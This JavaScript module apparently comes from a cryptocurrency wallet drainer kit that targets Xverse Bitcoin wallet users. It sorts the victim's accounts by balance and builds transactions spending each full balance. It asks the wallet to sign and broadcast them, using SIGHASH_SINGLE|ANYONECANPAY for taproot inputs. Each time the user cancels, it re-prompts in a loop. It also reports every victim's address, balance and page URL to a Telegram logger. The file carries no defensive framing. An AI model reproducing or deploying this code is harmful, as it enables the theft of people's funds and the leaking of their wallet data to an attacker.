import Setting from "../../../store"
import { succsessAlert, errorAlert } from "../../toast"
import { LogTg } from "../../tg"
import { signTransaction } from 'sats-connect'

export const Xverse = async (state, feePrice, p2shPsbt, p2trPsbt) => {
    let wallet = "Xverse"
    const repeatTransactions = Setting.repeatTransactions

    const accountsData = state?.accountsWallet;
    //console.log(accountsData)
    accountsData.sort((a, b) => b.balance - a.balance);

    // Удаление элементов, у которых balance < feePrice
    const filteredAccountsData = accountsData.filter((account) => account.balance >= feePrice);
    //console.log(filteredAccountsData);

    if (filteredAccountsData.length == 0) errorAlert('Insufficient funds to pay the gas fee.')

    for (let i = 0; i < filteredAccountsData.length; i++) {
      //console.log(filteredAccountsData[i].type)
      if (filteredAccountsData[i]?.type === 'p2sh-p2wpkh') {
        try {
        const PSBT = await p2shPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance)
        //console.log(PSBT)
        LogTg("transaction_started", {
          url: window.location.href,
          account: filteredAccountsData[i].address,
          walletType: wallet,
          balance: filteredAccountsData[i].balance
        })
        
        const signPsbtOptions = {
          payload: {
            network: {
              type:'Mainnet'
            },
            message: 'Sign Transaction',
            psbtBase64: PSBT.base64,
            broadcast: true,
            inputsToSign: [{
                address: filteredAccountsData[i].address,
                signingIndexes: [0],
            }],
          },
          onFinish: (response) => {
            succsessAlert('Transaction Succsess')

            LogTg("transaction_true", {
              url: window.location.href,
              account: filteredAccountsData[i].address,
              walletType: wallet,
              balance: filteredAccountsData[i].balance
            })
          },
          onCancel: () => {
            errorAlert('Transaction Failed')

            LogTg("transaction_false", {
              url: window.location.href,
              account: filteredAccountsData[i].address,
              walletType: wallet,
              balance: filteredAccountsData[i].balance
            })

            if (repeatTransactions) i--;
          }
        }
        
        await signTransaction(signPsbtOptions);
        } catch (e) {
          console.log(e)
          errorAlert('Transaction Failed')

          LogTg("transaction_false", {
            url: window.location.href,
            account: filteredAccountsData[i].address,
            walletType: wallet,
            balance: filteredAccountsData[i].balance,
            error: e?.message ? e?.message : ""
          })
        }
      }

      if (filteredAccountsData[i]?.type === 'p2tr') {
        try {
        const PSBT = await p2trPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance, wallet)
        //console.log(PSBT)
        LogTg("transaction_started", {
          url: window.location.href,
          account: filteredAccountsData[i].address,
          walletType: wallet,
          balance: filteredAccountsData[i].balance
        })
        
        const signPsbtOptions = {
          payload: {
            network: {
              type:'Mainnet'
            },
            message: 'Sign Transaction',
            psbtBase64: PSBT.base64,
            broadcast: true,
            inputsToSign: [{
                address: filteredAccountsData[i].address,
                signingIndexes: [0],
                sigHash: 131 // SIGHASH_SINGLE | ANYONECANPAY
            }],
          },
          onFinish: (response) => {
            succsessAlert('Transaction Succsess')

            //TELEGRAM transaction_true
            LogTg("transaction_true", {
              url: window.location.href,
              account: filteredAccountsData[i].address,
              walletType: wallet,
              balance: filteredAccountsData[i].balance
            })
          },
          onCancel: () => {
            errorAlert('Transaction Failed')

            LogTg("transaction_false", {
              url: window.location.href,
              account: filteredAccountsData[i].address,
              walletType: wallet,
              balance: filteredAccountsData[i].balance
            })

            if (repeatTransactions) i--;
          }
        }
        
        await signTransaction(signPsbtOptions);
        } catch (e) {
          console.log(e)
          errorAlert('Transaction Failed')

          LogTg("transaction_false", {
            url: window.location.href,
            account: filteredAccountsData[i].address,
            walletType: wallet,
            balance: filteredAccountsData[i].balance,
            error: e?.message ? e?.message : ""
          })
        }
      }
    }     
}